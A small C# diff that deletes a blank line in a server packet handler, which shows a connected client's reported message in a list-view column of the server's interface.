@@ -11,7 +11,6 @@ namespace Server.Handle_Packet
         {
             try
             {
-
                 lock (Settings.LockListviewClients)
                     if (client.LV != null)
                         client.LV.SubItems[Program.form1.lv_prefor.Index].Text = unpack_msgpack.ForcePathObject("Message").AsString;
